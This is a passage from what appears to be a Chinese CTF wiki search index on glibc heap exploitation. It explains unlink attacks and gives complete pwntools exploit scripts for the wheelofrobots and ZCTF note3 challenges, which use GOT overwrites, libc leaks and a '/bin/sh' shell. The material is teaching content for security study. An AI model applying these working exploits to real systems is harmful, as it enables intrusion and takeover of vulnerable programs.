\u8be5\u8986\u76d6\u4e3b\u8981\u662f\u4e3a\u4e86\u91ca\u653echunk2\u7684\u65f6\u5019\u53ef\u4ee5\u540e\u5411\u5408\u5e76\uff08\u5408\u5e76\u4f4e\u5730\u5740\uff09\uff0c\u5bf9chunk0\u4e2d\u865a\u62df\u6784\u9020\u7684chunk\u8fdb\u884cunlink\u3002\u5373\u5c06\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e3aunlink(ptr[0])\uff0c\u540c\u65f6\u6211\u4eec\u6240\u6784\u9020\u7684fakebk\u548cfakefd\u6ee1\u8db3\u5982\u4e0b\u7ea6\u675f if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ unlink\u6210\u529f\u6267\u884c\uff0c\u4f1a\u5bfc\u81f4ptr[0]\u6240\u5b58\u50a8\u7684\u5730\u5740\u53d8\u4e3afakebk\uff0c\u5373ptr-0x18\u3002","title":"\u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2"},{"location":"pwn/heap/unlink/#system","text":"\u4ee3\u7801\u5982\u4e0b # overwrite the chunk0(which is ptr[0]) with got atoi atoi_got = note2 . got [ 'atoi' ] content = 'a' * 0x18 + p64 ( atoi_got ) editnote ( 0 , 1 , content ) # get the aoti addr shownote ( 0 ) sh . recvuntil ( 'is ' ) atoi_addr = sh . recvuntil ( ' \\n ' , drop = True ) print atoi_addr atoi_addr = u64 ( atoi_addr . ljust ( 8 , ' \\x00 ' )) print 'leak atoi addr: ' + hex ( atoi_addr ) # get system addr atoi_offest = libc . symbols [ 'atoi' ] libcbase = atoi_addr - atoi_offest system_offest = libc . symbols [ 'system' ] system_addr = libcbase + system_offest print 'leak system addr: ' , hex ( system_addr ) \u6211\u4eec\u4fee\u6539ptr[0]\u7684\u5185\u5bb9\u4e3a ptr \u7684\u5730\u5740-0x18\uff0c\u6240\u4ee5\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 note0 \u65f6\uff0c\u53ef\u4ee5\u8986\u76d6ptr[0]\u7684\u5185\u5bb9\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u5176\u8986\u76d6\u4e3aatoi\u7684\u5730\u5740\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u67e5\u770bnote 0\u7684\u5185\u5bb9\uff0c\u5176\u5b9e\u67e5\u770b\u7684\u5c31\u662fatoi\u7684\u5730\u5740\u3002 \u4e4b\u540e\u6211\u4eec\u6839\u636e libc \u4e2d\u5bf9\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u51fa system \u7684\u5730\u5740\u3002","title":"\u83b7\u53d6system\u5730\u5740"},{"location":"pwn/heap/unlink/#atoi-got","text":"# overwrite the atoi got with systemaddr content = p64 ( system_addr ) editnote ( 0 , 1 , content ) \u7531\u4e8e\u6b64\u65f6 ptr[0] \u7684\u5730\u5740 got \u8868\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u8be5 note\uff0c\u8986\u76d6\u4e3a system \u5730\u5740\u3002","title":"\u4fee\u6539atoi got"},{"location":"pwn/heap/unlink/#get-shell","text":"# get shell sh . recvuntil ( 'option--->>' ) sh . sendline ( '/bin/sh' ) sh . interactive () \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u8c03\u7528 atoi \uff0c\u5176\u5b9e\u8c03\u7528\u7684\u5c31\u662f system \u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u62ff\u5230shell\u4e86\u3002","title":"get shell"},{"location":"pwn/heap/unlink/#2017-insomnihack-wheelofrobots","text":"","title":"2017 insomni'hack wheelofrobots"},{"location":"pwn/heap/unlink/#_9","text":"\u279c 2017_insomni 'hack_wheelofrobots git:(master) file wheelofrobots wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped \u279c 2017_insomni' hack_wheelofrobots git: ( master ) checksec wheelofrobots [ * ] \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots\" Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u52a8\u6001\u94fe\u63a564\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 canary \u4fdd\u62a4\u4e0e nx \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/unlink/#_10","text":"\u5927\u6982\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5f97\u77e5\uff0c\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u673a\u5668\u4eba\u8f6e\u5b50\u7684\u6e38\u620f\uff0c\u673a\u5668\u4eba\u4e00\u5171\u9700\u8981\u6dfb\u52a0 3 \u4e2a\u8f6e\u5b50\u3002 \u7a0b\u5e8f\u975e\u5e38\u4f9d\u8d56\u7684\u4e00\u4e2a\u529f\u80fd\u662f\u8bfb\u53d6\u6574\u6570\uff0c\u8be5\u51fd\u6570read_num\u662f\u8bfb\u53d6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a int \u7c7b\u578b\u7684\u6570\u5b57\u3002 \u5177\u4f53\u529f\u80fd\u5982\u4e0b \u6dfb\u52a0\u8f6e\u5b50\uff0c\u4e00\u5171\u6709 6 \u4e2a\u8f6e\u5b50\u53ef\u4ee5\u9009\u62e9\u3002\u9009\u62e9\u8f6e\u5b50\u65f6\u4f7f\u7528\u51fd\u6570\u662fread_num\uff0c\u7136\u800c\u8be5\u51fd\u6570\u5728\u8bfb\u53d6\u7684\u65f6\u5019 read_num((char *)&choice, 5uLL); \u8bfb\u53d6\u7684\u957f\u5ea6\u662f 5 \u4e2a\u5b57\u8282\uff0c\u6070\u597d\u8986\u76d6\u4e86 bender_inuse \u7684\u6700\u4f4e\u5b57\u8282\uff0c\u5373\u6784\u6210\u4e86 off-by-one \u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5728\u6dfb\u52a0 Destructor \u8f6e\u5b50\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u5927\u5c0f\u68c0\u6d4b\u3002\u5982\u679c\u8bfb\u53d6\u7684\u6570\u4e3a\u8d1f\u6570\uff0c\u90a3\u4e48\u5728\u7533\u8bf7 calloc(1uLL, 20 * v5); \u65f6\u5c31\u53ef\u80fd\u5bfc\u81f4 20*v5 \u6ea2\u51fa\uff0c\u4f46\u4e0e\u6b64\u540c\u65f6\uff0c destructor_size = v5 \u4ecd\u7136\u4f1a\u5f88\u5927\u3002 \u79fb\u9664\u8f6e\u5b50\uff0c\u76f4\u63a5\u5c06\u76f8\u5e94\u8f6e\u5b50\u79fb\u9664\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u5176\u5bf9\u5e94\u7684\u6307\u9488\u8bbe\u7f6e\u4e3a NULL \uff0c\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\u4e5f\u6ca1\u6709\u6e05\u7a7a\u3002 \u4fee\u6539\u8f6e\u5b50\u540d\u5b57\uff0c\u8fd9\u4e2a\u662f\u6839\u636e\u5f53\u65f6\u7533\u8bf7\u7684\u8f6e\u5b50\u7684\u5927\u5c0f\u7a7a\u95f4\u6765\u8bfb\u53d6\u6570\u636e\u3002\u4e4b\u524d\u6211\u4eec\u5df2\u7ecf\u8bf4\u8fc7 destructor \u8f6e\u5b50\u8bfb\u53d6\u5927\u5c0f\u65f6\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u8d1f\u6570\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u5728\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\u65f6 result = read(0, destructor, 20 * destructor_size); \uff0c\u5b58\u5728\u51e0\u4e4e\u4efb\u610f\u957f\u5ea6\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002 \u542f\u52a8\u673a\u5668\u4eba\uff0c\u5728\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u968f\u673a\u5730\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u540d\u79f0\uff0c\u8fd9\u4e2a\u662f\u6211\u4eec\u96be\u4ee5\u63a7\u5236\u7684\u3002 \u7efc\u4e0a\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u4e3b\u8981\u5b58\u5728\u7684\u6f0f\u6d1e off-by-one \u4e0e\u6574\u6570\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4f7f\u7528\u524d\u9762\u7684off-by-one \u6f0f\u6d1e\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/unlink/#_11","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 off by one \u6f0f\u6d1e\u4e0e fastbin attack \u5206\u914d chunk \u5230 0x603138\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236 destructor_size \u7684\u5927\u5c0f\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5c06\u8f6e\u5b501 tinny \u5206\u914d\u5230\u8fd9\u91cc\u3002 \u5206\u522b\u5206\u914d\u5408\u9002\u5927\u5c0f\u7684\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u5176\u4e2d\u5305\u62ec destructor\u3002\u501f\u52a9\u4e0a\u9762\u53ef\u4ee5\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\uff0c\u5bf9 destructor \u5bf9\u5e94\u7684 chunk \u8fdb\u884c\u6ea2\u51fa\uff0c\u5c06\u5176\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 0x6030E8 \u5904 fake chunk \u8fdb\u884c unlink \u7684\u6548\u679c\uff0c\u8fd9\u65f6 bss \u6bb5\u7684 destructor \u6307\u5411 0x6030D0\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u5b9e\u73b0\u8986\u76d6bss \u6bb5\u51e0\u4e4e\u6240\u6709\u7684\u5185\u5bb9\u3002 \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b501 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002 \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 exit() patch \u4e3a\u4e00\u4e2a ret \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002 \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc\u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002 \u4ee3\u7801\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./wheelofrobots\" robots = ELF ( './wheelofrobots' ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./wheelofrobots\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def add ( idx , size = 0 ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) if idx == 2 : p . recvuntil ( \"Increase Bender's intelligence: \" ) p . sendline ( str ( size )) elif idx == 3 : p . recvuntil ( \"Increase Robot Devil's cruelty: \" ) p . sendline ( str ( size )) elif idx == 6 : p . recvuntil ( \"Increase Destructor's powerful: \" ) p . sendline ( str ( size )) def remove ( idx ): p . recvuntil ( 'Your choice :' ) p . sendline ( '2' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) def change ( idx , name ): p . recvuntil ( 'Your choice :' ) p . sendline ( '3' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) p . recvuntil ( \"Robot's name: \\n \" ) p . send ( name ) def start_robot (): p . recvuntil ( 'Your choice :' ) p . sendline ( '4' ) def overflow_benderinuse ( inuse ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . send ( '9999' + inuse ) def write ( where , what ): change ( 1 , p64 ( where )) change ( 6 , p64 ( what )) def exp (): print \"step 1\" # add a fastbin chunk 0x20 and free it # so it is in fastbin, idx2->NULL add ( 2 , 1 ) # idx2 remove ( 2 ) # overflow bender inuse with 1 overflow_benderinuse ( ' \\x01 ' ) # change bender's fd to 0x603138, point to bender's size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # in order add bender again overflow_benderinuse ( ' \\x00 ' ) # add bender again, fastbin 0x603138->NULL add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # it is at Robot Devil add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # wheels must <= 3 remove ( 2 ) remove ( 3 ) print 'step 2' # alloc Destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) print 'step 3' # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) print 'step 4' # make exit just as return write ( robots . got [ 'exit' ], 0x401954 ) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write ( 0x603130 , 3 ) # set destructor point to puts@got change ( 1 , p64 ( robots . got [ 'puts' ])) start_robot () p . recvuntil ( 'New hands great!! Thx ' ) puts_addr = p . recvuntil ( '! \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] log . success ( 'libc base: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) # make free->system write ( robots . got [ 'free' ], system_addr ) # make destructor point to /bin/sh addr write ( 0x6030E8 , binsh_addr ) # get shell remove ( 6 ) p . interactive () pass if __name__ == \"__main__\" : exp ()","title":"\u5229\u7528\u601d\u8def"},{"location":"pwn/heap/unlink/#_12","text":"DEFCON 2017 Qualifiers beatmeonthedl","title":"\u9898\u76ee"},{"location":"pwn/heap/unlink/#_13","text":"malloc@angelboy https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a","title":"\u53c2\u8003"},{"location":"pwn/heap/unlink/#note3","text":"","title":"note3"},{"location":"pwn/heap/unlink/#_14","text":"ZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/unlink/#_15","text":"\u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd 1.New note 2.Show note 3.Edit note 4.Delete note 5.Quit option--->> \u4fdd\u62a4\u5982\u4e0b\u6240\u793a Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Partial","title":"\u9898\u76ee\u4ecb\u7ecd"},{"location":"pwn/heap/unlink/#_16","text":"\u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002 int new() { puts(\"Input the length of the note content:(less than 1024)\"); size = get_num(); if ( size < 0 ) return puts(\"Length error\"); if ( size > 1024 ) return puts(\"Content is too long\"); heap_ptr = malloc(size); puts(\"Input the note content:\"); my_read(heap_ptr, size, '\\n'); bss_ptr[i] = heap_ptr; current_ptr[i + 8LL] = size; current_ptr[0] = bss_ptr[i]; return printf(\"note add success, the id is %d\\n\", i); } \u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002 \u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002 .bss: current_ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size Show\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002","title":"\u529f\u80fd\u6982\u8ff0"},{"location":"pwn/heap/unlink/#_17","text":"\u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002 \u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002 int edit() { id = get_num(); data_ptr = ptr[id]; if ( data_ptr ) { puts(\"Input the new content:\"); my_read(ptr[id], current_ptr[id + 8], '\\n'); current_ptr[0] = ptr[id]; data_ptr = puts(\"Edit success\"); } } \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr .bss: current_ptr <== edit ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr <== size note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size \u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3 new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') new(512,'a') edit(3,'a') edit(-9223372036854775808,data); \u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002 data = '' data += p64(0) + p64(512+1) #fake chunk header data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk data += 'A'*(512-32) data += p64(512) + p64(512+16) \u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002 \u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002 \u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002 \u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002 \u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell free(4) edit(3,free_got) edit(0,printf_plt) edit(3,p64(0x6020e8)) edit(0,'%llx.'*30) \u5b8c\u6210\u7684exp\u5982\u4e0b #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * import time def malloc(size,data): print conn.recvuntil('>>') conn.sendline('1') print conn.recvuntil('1024)') conn.sendline(str(size)) print conn.recvuntil('content:') conn.sendline(data) print conn.recvuntil('\\n') def edit(id,data): print conn.recvuntil('>>') conn.sendline('3') print conn.recvuntil('note:') conn.sendline(str(id)) print conn.recvuntil('ent:') conn.sendline(data) print conn.recvuntil('success') def free(id): print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(id)) print conn.recvuntil('success') #conn = remote('127.0.0.1',9999) conn = remote('115.28.27.103',9003) free_got = p64(0x602018) puts_got = p64(0x602020) stack_got = p64(0x602038) printf_got = p64(0x602030) exit_got = p64(0x602078) printf_plt = p64(0x400750) puts_plt = p64(0x400730) #libcstartmain_ret_off = 0x21b45 #sys_off = 0x414f0 libcstartmain_ret_off = 0x21ec5 sys_off = 0x46640 # 1. int overflow lead to double free intoverflow = -9223372036854775808 malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,'/bin/sh\\0') malloc(512,p64(0x400ef8)) malloc(512,'/bin/sh\\0') # 2. make a fake chunk and modify the next chunk's pre size fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16) edit(3,'aaaaaa') edit(intoverflow,fakechunk) # 3. double free free(4) # 4. overwrite got edit(3,free_got) edit(0,printf_plt+printf_plt) # 5. leak the stack data edit(3,p64(0x6020e8)) edit(0,'%llx.'*30) #free->puts print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(0)) #time.sleep(0.3) ret = conn.recvuntil('success') print ret # 6. calcuate the system's addr libcstart = ret.split('.')[10] libcstart_2 = int(libcstart,16) - libcstartmain_ret_off print 'libc start addr:',hex(libcstart_2) system_addr = libcstart_2 + sys_off print 'system_addr:',hex(system_addr) # 7. overwrite free's got edit(3,free_got) edit(0,p64(system_addr)+printf_plt) # 8. write argv edit(3,p64(0x6020d0)) edit(0,'/bin/sh\\0') # 9. exploit print conn.recvuntil('>>') conn.sendline('4') print conn.recvuntil('note:') conn.sendline(str(0)) sleep(0.2) conn.interactive()","title":"\u6f0f\u6d1e"},{"location":"pwn/heap/unsorted_bin_attack/","text":"Unsorted Bin Attack \u00b6 \u6982\u8ff0 \u00b6 Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002 Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002 Unsorted Bin \u56de\u987e \u00b6 \u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002 \u57fa\u672c\u6765\u6e90 \u00b6 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8etop chunk\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin 